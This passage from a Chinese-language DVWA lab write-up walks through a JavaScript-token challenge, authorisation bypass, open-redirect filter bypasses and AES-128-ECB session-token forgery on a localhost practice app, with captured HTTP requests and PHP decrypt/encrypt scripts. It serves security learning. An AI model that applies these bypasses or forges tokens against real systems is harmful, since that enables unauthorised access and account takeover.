f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW', 'split'];
(function(c, d) {
    var e = function(f) {
        while (--f) {
            c['push'](c['shift']());
        }
    };
    e(++d);
}(a, 0x1f4));
var b = function(c, d) {
    c = c - 0x0;
    var e = a[c];
    return e;
};
eval(function(d, e, f, g, h, i) {
    h = function(j) {
        return (j < e ? '' : h(parseInt(j / e))) + ((j = j % e) > 0x23 ? String[b('0x0')](j + 0x1d) : j[b('0x1')](0x24));
    }
    ;
    if (!''[b('0x2')](/^/, String)) {
        while (f--) {
            i[h(f)] = g[f] || h(f);
        }
        g = [function(k) {
            if ('wpA' !== b('0x3')) {
                return i[k];
            } else {
                while (f--) {
                    i[k(f)] = g[f] || k(f);
                }
                g = [function(l) {
                    return i[l];
                }
                ];
                k = function() {
                    return b('0x4');
                }
                ;
                f = 0x1;
            }
        }
        ];
        h = function() {
            return b('0x4');
        }
        ;
        f = 0x1;
    }
    ;while (f--) {
        if (g[f]) {
            if (b('0x5') === b('0x6')) {
                return i[h];
            } else {
                d = d[b('0x2')](new RegExp('\x5cb' + h(f) + '\x5cb','g'), g[f]);
            }
        }
    }
    return d;
}(b('0x7'), 0x3e, 0x137, b('0x8')[b('0x9')]('|'), 0x0, {}));
```

用了 JS 混淆，属于前端防御措施，去第三方网站解码

[http://deobfuscatejavascript.com/#](http://deobfuscatejavascript.com/#)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754558077967-6ac12c29-4a85-45f1-bcb0-473704b1fd31.png)

得到

```plain
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

 先填入success，然后依次执行 token_part_1("ABCD", 44) 和 token_part_2("XX")，最后点击提交执行

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754558435578-30b1b9e5-c815-4a4c-af37-b9814c6e63e0.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754558424727-0c855e4e-03ca-4304-a105-25568c941a3b.png)

## 十五、授权绕过（Authorisation Bypass）
### 前言
授权绕过（Authorisation Bypass）是一种严重的安全，通过利用系统的或错误配置，绕过正常的访问控制机制，获得未经授权的访问权限。这种可能导致敏感信息泄露、数据篡改、系统破坏等严重后果

以下是一些常见的授权绕过场景：

未验证的直接对象引用：系统没有对用户进行权限检查就直接访问对象。例如，通过猜测URL参数来访问其他用户的文件或数据。

功能级访问控制：系统没有妥善限制用户对某些特定管理功能或数据的访问，导致攻击者能够执行超出其权限的操作。

垂直权限提升：低权限用户可以通过漏洞取得高权限用户才拥有的权限，如管理员功能。

水平权限提升：一个用户访问或修改同一权限级别的其他用户的数据，如查看他人的订单信息。

不安全的角色验证：系统对角色身份验证存在缺陷，允许攻击者冒充其他角色。

预防和修复授权绕过漏洞需要全面实施和审核权限控制机制，包括：

定义和实现基于角色的访问控制。

确保每个请求都经过严格的身份验证和授权检查。

定期进行安全审核和渗透测试以发现潜在漏洞。

### 难度low
审计代码

```plain
 <?php
/*
Nothing to see here for this vulnerability, have a look
instead at the dvwaHtmlEcho function in:
* dvwa/includes/dvwaPage.inc.php
*/
 
?>
```

没有做任何限制

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754620730984-ae1a7cb7-5434-45ca-bf90-7bc9c10d945a.png)

可以看到表信息和路径 vulnerabilities/authbypass

[**http://localhost/DVWA/vulnerabilities/authbypass/**](http://localhost/DVWA/vulnerabilities/authbypass/)

登出，用页面上给的gordonb/abc123登陆进去，可以看到左边菜单没有这一栏了

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754620714987-ec00f61a-190c-47df-bea0-687d1670f205.png)

访问刚才的路径[http://localhost/DVWA/vulnerabilities/authbypass/](http://localhost/DVWA/vulnerabilities/authbypass/)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754621063531-ada896d3-cd66-41c0-89cf-ec8018757603.png)

又有力！而且还有回显数据库信息

### 难度medium
审计代码

```plain
<?php
/*
Only the admin user is allowed to access this page.
Have a look at these two files for possible vulnerabilities: 
* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php
*/
 
if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
?>
```

对用户名做出了限制，再用low的方法去访问[http://localhost/DVWA/vulnerabilities/authbypass/](http://localhost/DVWA/vulnerabilities/authbypass/)会显示Unauthorised

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754621328030-c275af18-d264-4369-8b7c-6ecb3b953cb5.png)

把在low里回显数据库信息的文件/authbypass/get_user_data.php拼接到url里，访问[http://localhost/DVWA/vulnerabilities/authbypass/get_user_data.php](http://localhost/DVWA/vulnerabilities/authbypass/get_user_data.php)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754621964571-b824a634-9dd1-4354-8f8b-0054a38b6a04.png)

又看到呢

### 难度high
审计代码

```plain
<?php
/*
Only the admin user is allowed to access this page.
Have a look at this file for possible vulnerabilities: 
* vulnerabilities/authbypass/change_user_details.php
*/
 
if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
?>
```

看代码和medium是一样的，用medium的方法会报错

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754630328533-95ef98a4-542a-4c11-91db-4d3b30427a75.png)

用admin账户改一下信息试试，有个文件change_user_details.php

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754622964112-e8127fe3-ddc1-4949-a909-97386e2d5115.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754630212521-26d6b297-f10a-48f1-8ee1-d260e23c2a16.png)

```plain
POST /DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1

Host: localhost

Content-Length: 43

sec-ch-ua-platform: "Linux"

Accept-Language: en-US,en;q=0.9

Accept: application/json

sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"

Content-Type: application/json

sec-ch-ua-mobile: ?0

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36

Origin: http://localhost

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: http://localhost/DVWA/vulnerabilities/authbypass/

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=a7913b02cc89d6609ed92b618b0aaaef; security=high

Connection: keep-alive



{"id":5,"first_name":"aaa","surname":"bbb"}
```

切换成gordonb用户访问get_user_data.php，burpsuite抓包，把之前change_user_details.php的内容写在POST请求里提交

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754631257761-f60f0d3a-f075-4907-9892-7bd5ca13d3bb.png)

返回了成功信息，切换成admin回去看

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754631287577-f517cf95-096d-4637-b340-947afe567703.png)

修改成功了

## 十六、开放重定向漏洞（Open HTTP Redirect）
### 前言
当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。

常见的 HTTP 状态码：

1xx（信息性状态码）：表示接收的请求正在处理。

2xx（成功状态码）：表示请求正常处理完毕。

3xx（重定向状态码）：需要后续操作才能完成这一请求。

4xx（客户端错误状态码）：表示请求包含语法错误或无法完成。

5xx（服务器错误状态码）：服务器在处理请求的过程中发生了错误。

| <font style="background-color:rgba(255, 255, 255, 0);">分类</font> | <font style="background-color:rgba(255, 255, 255, 0);">分类描述</font> |
| :--- | :--- |
| <font style="background-color:rgba(255, 255, 255, 0);">1**</font> | <font style="background-color:rgba(255, 255, 255, 0);">信息，服务器收到请求，需要请求者继续执行操作</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">2**</font> | <font style="background-color:rgba(255, 255, 255, 0);">成功，操作被成功接收并处理</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">3**</font> | <font style="background-color:rgba(255, 255, 255, 0);">重定向，需要进一步的操作以完成请求</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">4**</font> | <font style="background-color:rgba(255, 255, 255, 0);">客户端错误，请求包含语法错误或无法完成请求</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">5**</font> | <font style="background-color:rgba(255, 255, 255, 0);">服务器错误，服务器在处理请求的过程中发生了错误</font> |


| 状态码 | 状态码英文名称 | 中文描述 |
| --- | --- | --- |
| 100 | Continue | 继续。客户端应继续其请求 |
| 101 | Switching Protocols | 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 |
|  | | |
| 200 | OK | 请求成功。一般用于GET与POST请求 |
| 201 | Created | 已创建。成功请求并创建了新的资源 |
| 202 | Accepted | 已接受。已经接受请求，但未处理完成 |
| 203 | Non-Authoritative Information | 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 |
| 204 | No Content | 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 |
| 205 | Reset Content | 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 |
| 206 | Partial Content | 部分内容。服务器成功处理了部分GET请求 |
|  | | |
| 300 | Multiple Choices | 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 |
| 301 | Moved Permanently | 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 |
| 302 | Found | 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI |
| 303 | See Other | 查看其它地址。与301类似。使用GET和POST请求查看 |
| 304 | Not Modified | 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |
| 305 | Use Proxy | 使用代理。所请求的资源必须通过代理访问 |
| 306 | Unused | 已经被废弃的HTTP状态码 |
| 307 | Temporary Redirect | 临时重定向。与302类似。使用GET请求重定向 |
|  | | |
| 400 | Bad Request | 客户端请求的语法错误，服务器无法理解 |
| 401 | Unauthorized | 请求要求用户的身份认证 |
| 402 | Payment Required | 保留，将来使用 |
| 403 | Forbidden | 服务器理解请求客户端的请求，但是拒绝执行此请求 |
| 404 | Not Found | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置"您所请求的资源无法找到"的个性页面 |
| 405 | Method Not Allowed | 客户端请求中的方法被禁止 |
| 406 | Not Acceptable | 服务器无法根据客户端请求的内容特性完成请求 |
| 407 | Proxy Authentication Required | 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 |
| 408 | Request Time-out | 服务器等待客户端发送的请求时间过长，超时 |
| 409 | Conflict | 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 |
| 410 | Gone | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |
| 411 | Length Required | 服务器无法处理客户端发送的不带Content-Length的请求信息 |
| 412 | Precondition Failed | 客户端请求信息的先决条件错误 |
| 413 | Request Entity Too Large | 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |
| 414 | Request-URI Too Large | 请求的URI过长（URI通常为网址），服务器无法处理 |
| 415 | Unsupported Media Type | 服务器无法处理请求附带的媒体格式 |
| 416 | Requested range not satisfiable | 客户端请求的范围无效 |
| 417 | Expectation Failed（预期失败） | 服务器无法满足请求头中 Expect 字段指定的预期行为。 |
| 418 | I'm a teapot | 状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。 |
|  | | |
| 500 | Internal Server Error | 服务器内部错误，无法完成请求 |
| 501 | Not Implemented | 服务器不支持请求的功能，无法完成请求 |
| 502 | Bad Gateway | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |
| 503 | Service Unavailable | 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |
| 504 | Gateway Time-out | 充当网关或代理的服务器，未及时从远端服务器获取请求 |
| 505 | HTTP Version not supported | 服务器不支持请求的HTTP协议的版本，无法完成处理 |


HTTP 重定向（HTTP Redirect Attack）是一种网络，利用 HTTP 协议中的重定向机制，将用户引导至恶意网站或非法页面，进而进行钓鱼、恶意软件传播等恶意行为。攻击者通常通过操控重定向响应头或 URL 参数实现。

**HTTP 重定向基本原理**

HTTP 重定向是一种用于通知客户端（如浏览器）请求的资源已被移动到另一个位置的机制，通常由服务器发送 3xx 系列状态码响应。常见的重定向状态码包括：

301 Moved Permanently：永久重定向，表示请求的资源已被永久移动到新的 URL。

302 Found：临时重定向，表示请求的资源临时在另一个 URL 上。

303 See Other：建议客户端使用 GET 方法获取资源。

307 Temporary Redirect：临时重定向，保持请求方法不变。

308 Permanent Redirect：永久重定向，保持请求方法不变。

**HTTP 重定向方式**

HTTP 重定向主要利用了合法的重定向机制，通过各种方式将用户重定向到恶意网站。常见的方式包括：

开放重定向（Open Redirect）：

通过操控网站的 URL 参数，实现对重定向目标的控制。例如，合法网站的 URL 参数redirect=[http://example.com](http://example.com) 被替换为 redirect=[http://malicious.com](http://malicious.com)，导致用户被重定向到恶意网站。

钓鱼（Phishing）：

利用重定向将用户引导到伪装成合法网站的恶意网站，诱骗用户输入敏感信息（如登录凭证、银行账号）。

恶意软件传播（Malware Distribution）：

通过重定向将用户引导到托管恶意软件的网站，诱骗用户下载和安装恶意软件。

### 难度low
审计代码

```plain
<?php
// 检查URL中是否存在'redirect'参数，并且该参数不为空。
if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != "") {
    // 如果存在'redirect'参数且不为空，则进行重定向到指定的路径。
    header("location: " . $_GET['redirect']);
    exit; // 终止脚本执行
}
// 如果'redirect'参数不存在或为空，则返回HTTP 500状态码并显示缺少重定向目标的错误信息。
http_response_code(500);
?>
<p>Missing redirect target.</p>
<?php
exit; // 终止脚本执行
?>
```

首先通过 array_key_exists 函数判断 $_GET 数组中是否存在 redirect 键值，如果存在且不为空，则调用 header 函数，否则返回 500 状态码；调用 header 函数，将 Location 字段设置为 $_GET['redirect'] 的值，完成重定向操作。exit 函数用于终止脚本的执行，确保 header 函数的执行效果。

不管了都先看一遍再说

[http://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=1](http://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=1)



![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754633827152-d99526ae-4868-44cd-8603-954aa1465a78.png)

[http://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=2](http://localhost/DVWA/vulnerabilities/open_redirect/source/info.php?id=2)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754633844169-9e51a9c0-1747-4936-a05c-cca42a564fa2.png)

url栏有传参点，f12定位源码查看，发现重定向点

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754634434975-765a8804-6238-435e-92c5-965798a69991.png)

把第一个修改为 source/low.php?redirect=[http://www.baidu.com](http://www.baidu.com)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754634626007-db0fb7a0-f333-450a-aaa4-4e2fabeef920.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754634696335-125b492d-9cd2-4c7c-979f-77d1045a7b9c.png)

跳转了

或者访问[http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https://baidu.com](http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https://baidu.com)，也跳转了

### 难度medium
审计代码

```plain
<?php
// 检查URL中是否存在'redirect'参数，并且该参数不为空。
if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != "") {
    // 使用正则表达式检查'redirect'参数是否包含不安全的绝对URL。
    if (preg_match("/http:\/\/|https:\/\//i", $_GET['redirect'])) {
        // 如果是绝对URL，则返回HTTP 500状态码，并显示错误信息。
        http_response_code(500);
        ?>
        <p>Absolute URLs not allowed.</p>
        <?php
        exit; // 终止脚本执行
    } else {
        // 如果是相对路径，则进行重定向到指定的路径。
        header("location: " . $_GET['redirect']);
        exit; // 终止脚本执行
    }
}
// 如果'redirect'参数不存在，则返回HTTP 500状态码并显示缺少重定向目标的错误信息。
http_response_code(500);
?>
<p>Missing redirect target.</p>
<?php
exit; // 终止脚本执行
?>
```

与low级别的方法没什么区别，查看源码可以发现不同的地方在于禁用了http://，https:// 字段

构造url绕过 source/low.php?redirect=www.baidu.com，如果没有明确指定协议，直接以 // 开头，则表示使用和当前页面相同的协议，便可以绕过了

把source/low.php?redirect=//www.baidu.com放进去

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754635399610-9436fec8-d4d2-454f-88a1-a3fba611e0f7.png)

成功跳转了

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754635363823-ea580f04-803f-4f5e-93ce-1e12d3e926f6.png)

或者构造url source/low.php?redirect=//www.baidu.com 访问[http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=//www.baidu.com](http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https://baidu.com)也成功跳转了

### 难度high
审计代码

```plain
<?php
// 检查URL中是否存在'redirect'参数，并且该参数不为空。
if (array_key_exists("redirect", $_GET) && $_GET['redirect'] != "") {
    // 检查'redirect'参数中是否包含"info.php"。
    if (strpos($_GET['redirect'], "info.php") !== false) {
        // 如果包含"info.php"，则进行重定向。
        header("location: " . $_GET['redirect']);
        exit; // 终止脚本执行
    } else {
        // 如果不包含"info.php"，返回HTTP 500状态码和错误信息。
        http_response_code(500);
        ?>
        <p>You can only redirect to the info page.</p>
        <?php
        exit; // 终止脚本执行
    }
}
// 如果'redirect'参数不存在或为空，则返回HTTP 500状态码并显示缺少重定向目标的错误信息。
http_response_code(500);
?>
<p>Missing redirect target.</p>
<?php
exit; // 终止脚本执行
?>
```

检查了url种是否含有info.php字段，如果没有则会过滤

构造url绕过：source/low.php?redirect=[http://www.baidu.com?id=info.php](http://www.baidu.com?id=info.php)

f12改也可以，直接访问[http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=](http://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=//www.baidu.com)[http://www.baidu.com?id=info.php](http://www.baidu.com?id=info.php)也可以

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754636062413-23d9b877-12b2-4424-b7d1-6442012a193c.png)

## 十七、密码学缺陷（Cryptography Problems）
### 前言
Cryptography 模块主要演示了与加密算法相关的安全漏洞，特别是在实现加密功能时常见的错误。

### 难度low
审计代码

```plain
function xor_this($cleartext, $key) {
    $outText = '';
    for($i=0; $i<strlen($cleartext);) {
        for($j=0; ($j<strlen($key) && $i<strlen($cleartext)); $j++,$i++) {
            $outText .= $cleartext[$i] ^ $key[$j];
        }
    }
    return $outText;
}
```

该函数使用循环遍历明文 cleartext，并与 key 进行 XOR（^） 异或运算。 

如果 key 的长度小于 cleartext，则 key 会循环使用。 

最终输出的是二进制数据，并在后续可能经过 Base64 编码。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754636800495-f62a6c12-83b1-4030-bf8b-a71a8c558264.png)

神奇我把下面的放到上面去解码得到了一句话 Your new password is: Olifant

然后把Olifant填进去，就登陆成功了。。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754636860077-c4a86e3a-66e6-4b80-acd5-7a39044cb47a.png)

### 难度medium
审计代码

```plain
<?php
function decrypt ($ciphertext, $key) {
    $e = openssl_decrypt($ciphertext, 'aes-128-ecb', $key, OPENSSL_PKCS1_PADDING);
    if ($e === false) {
        throw new Exception ("Decryption failed");
    }
    return $e;
}

$key = "ik ben een aardbei";

$errors = "";
$success = "";
$messages = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    try {
        if (!array_key_exists ('token', $_POST)) {
            throw new Exception ("No token passed");
        } else {
            $token = $_POST['token'];
            if (strlen($token) % 32 != 0) {
                throw new Exception ("Token is in wrong format");
            } else {
                $decrypted = decrypt(hex2bin ($token), $key);

                $user = json_decode ($decrypted);
                if ($user === null) {
                    throw new Exception ("Could not decode JSON object.");
                }

                if ($user->user == "sweep" && $user->ex > time() && $user->level == "admin") {
                    $success = "Welcome administrator Sweep";
                } else {
                    $messages = "Login successful but not as the right user.";
                }
            }
        }
    } catch(Exception $e) {
        $errors = $e->getMessage();
    }
}

$html = "
        <p>
        You have managed to get hold of three session tokens for an application you think is using poor cryptography to protect its secrets:
        </p>
        <p>
        <strong>Sooty (admin), session expired</strong>
        </p>
        <p>
<textarea style='width: 600px; height: 56px'>e287af752ed3f9601befd45726785bd9b85bb230876912bf3c66e50758b222d0837d1e6b16bfae07b776feb7afe576305aec34b41499579d3fb6acc8dc92fd5fcea8743c3b2904de83944d6b19733cdb48dd16048ed89967c250ab7f00629dba</textarea>
        </p>
        <p>
        <strong>Sweep (user), session expired</strong>
        </p>
        <p>
<textarea style='width: 600px; height: 56px'>3061837c4f9debaf19d4539bfa0074c1b85bb230876912bf3c66e50758b222d083f2d277d9e5fb9a951e74bee57c77a3caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07</textarea>
        </p>
        <p>
        <strong>Soo (user), session valid</strong>
        </p>
        <p>
<textarea style='width: 600px; height: 56px'>5fec0b1c993f46c8bad8a5c8d9bb9698174d4b2659239bbc50646e14a70becef83f2d277d9e5fb9a951e74bee57c77a3c9acb1f268c06c5e760a9d728e081fab65e83b9f97e65cb7c7c4b8427bd44abc16daa00fd8cd0105c97449185be77ef5</textarea>
        </p>
        <p>
        Based on the documentation, you know the format of the token is:
        </p>
        <pre><code>{
    \"user\": \"example\",
    \"ex\": 1723620372,
    \"level\": \"user\",
    \"bio\": \"blah\"
}</code></pre>
<p>
You also spot this comment in the docs:
</p>
<blockquote><i>
To ensure your security, we use aes-128-ecb throughout our application.
</i></blockquote>

        <hr>
        <p>
        Manipulate the session tokens you have captured to log in as Sweep with admin privileges.
";

if ($errors != "") {
    echo '<div class="warning">' . $errors . '</div>';
}

if ($messages != "") {
    echo '<div class="nearly">' . $messages . '</div>';
}

if ($success != "") {
    echo '<div class="success">' . $success . '</div>';
}

echo "
        <form name=\"ecb\" method='post' action=\"" . $_SERVER['PHP_SELF'] . "\">
            <p>
                <label for='token'>Token:</lable><br />
<textarea style='width: 600px; height: 56px' id='token' name='token'></textarea>
            </p>
            <p>
                <input type=\"submit\" value=\"Submit\">
            </p>
        </form>
";
?>
```

使用 AES-128-ECB 模式解密；密钥为固定值 "ik ben een aardbei"

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754637263655-ced33d2d-1057-4bc9-adcb-adf222ea7189.png)

翻译：

你设法获取了三个会话令牌，怀疑应用程序使用了脆弱的加密技术保护数据：

Sooty (管理员)，会话已过期

e287af752ed3f9601befd45726785bd9b85bb230876912bf3c66e50758b222d0837d1e6b16bfae07b776feb7afe576305aec34b41499579d3fb6acc8dc92fd5fcea8743c3b2904de83944d6b19733cdb48dd16048ed89967c250ab7f00629dba

Sweep (用户)，会话已过期

3061837c4f9debaf19d4539bfa0074c1b85bb230876912bf3c66e50758b222d083f2d277d9e5fb9a951e74bee57c77a3caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07

Soo (用户)，会话有效

5fec0b1c993f46c8bad8a5c8d9bb9698174d4b2659239bbc50646e14a70becef83f2d277d9e5fb9a951e74bee57c77a3c9acb1f268c06c5e760a9d728e081fab65e83b9f97e65cb7c7c4b8427bd44abc16daa00fd8cd0105c97449185be77ef5

根据文档，令牌格式为：

json

{

    "user": "example",

    "ex": 1723620372,

    "level": "user",

    "bio": "blah"

}

文档中的注释：

为确保安全，我们全程使用 aes-128-ecb 加密

请利用这些会话令牌，通过篡改数据以 Sweep用户身份获得管理员权限



源码里写了密钥匙  $key = "ik ben een aardbei";

if ($user->user == "sweep" && $user->ex > time() && $user->level == "admin") {

    $success = "Welcome administrator Sweep";

}

那我需要构造的令牌是

{

    "user": "Sweep",

    "ex": 任意未来时间戳，抄soo的也可以,

    "level": "admin",

    "bio": 他本来的值 

}

根据源码，写一个解密脚本（伟大gpt5帮忙），把页面上三个token放进去解密

```plain
<?php
function decrypt($ciphertext_hex, $key) {
    // 将十六进制转换为二进制
    $ciphertext_bin = hex2bin($ciphertext_hex);

    // 解密（使用 AES-128-ECB，PKCS7 padding）
    $decrypted = openssl_decrypt($ciphertext_bin, 'aes-128-ecb', $key, OPENSSL_RAW_DATA);

    if ($decrypted === false) {
        throw new Exception("Decryption failed");
    }

    return $decrypted;
}

$key = "ik ben een aardbei";

// 三个token定义
$token_sooty = "e287af752ed3f9601befd45726785bd9b85bb230876912bf3c66e50758b222d0837d1e6b16bfae07b776feb7afe576305aec34b41499579d3fb6acc8dc92fd5fcea8743c3b2904de83944d6b19733cdb48dd16048ed89967c250ab7f00629dba";
$token_sweep = "3061837c4f9debaf19d4539bfa0074c1b85bb230876912bf3c66e50758b222d083f2d277d9e5fb9a951e74bee57c77a3caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07";
$token_soo = "5fec0b1c993f46c8bad8a5c8d9bb9698174d4b2659239bbc50646e14a70becef83f2d277d9e5fb9a951e74bee57c77a3c9acb1f268c06c5e760a9d728e081fab65e83b9f97e65cb7c7c4b8427bd44abc16daa00fd8cd0105c97449185be77ef5";

try {
    $plaintext = decrypt($token_sooty, $key);
    echo "[Sooty] 解密结果:\n$plaintext\n\n";
} catch (Exception $e) {
    echo "[Sooty] 错误: " . $e->getMessage() . "\n";
}

try {
    $plaintext = decrypt($token_sweep, $key);
    echo "[Sweep] 解密结果:\n$plaintext\n\n";
} catch (Exception $e) {
    echo "[Sweep] 错误: " . $e->getMessage() . "\n";
}

try {
    $plaintext = decrypt($token_soo, $key);
    echo "[Soo] 解密结果:\n$plaintext\n";
} catch (Exception $e) {
    echo "[Soo] 错误: " . $e->getMessage() . "\n";
}
?>
```

得到如下：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754641572881-01cd66d9-d9b6-41a2-b314-5eb621c991e5.png)

{"user":"sooty","ex":1723620672,"level":"admin","bio":"Izzy wizzy let's get busy"}

{"user":"sweep","ex":1723620672,"level": "user","bio": "Squeeeeek"}

{"user" : "soo","ex":1823620672,"level": "user","bio": "I won The Weakest Link"}

再写一个加密脚本（伟大gpt5产生）

```plain
<?php
function encrypt($plaintext, $key) {
    // 加密为 AES-128-ECB（原始二进制数据，默认使用 PKCS7 Padding）
    $ciphertext = openssl_encrypt($plaintext, 'aes-128-ecb', $key, OPENSSL_RAW_DATA);
    if ($ciphertext === false) {
        throw new Exception("Encryption failed");
    }
    return bin2hex($ciphertext);
}

$key = "ik ben een aardbei";

// 精确格式匹配，仿照之前解密出来的 JSON 格式
$payload = '{"user" : "sweep","ex":1823620672,"level": "admin","bio": "Squeeeeek"}';

// 输出长度，必须是 AES 的 16 字节倍数（ECB 分组要求）
echo "JSON length: " . strlen($payload) . "\n";
if (strlen($payload) % 16 !== 0) {
    echo "⚠️ Warning: JSON length is not a multiple of 16 bytes!\n";
}

echo "JSON to encrypt:\n$payload\n\n";

// 执行加密
try {
    $token = encrypt($payload, $key);
    echo "Forged Token (HEX):\n$token\n";
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
```

运行得到如下：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754641903900-61b8b7e7-e5d7-4e9e-ae56-6a2f11afc01a.png)

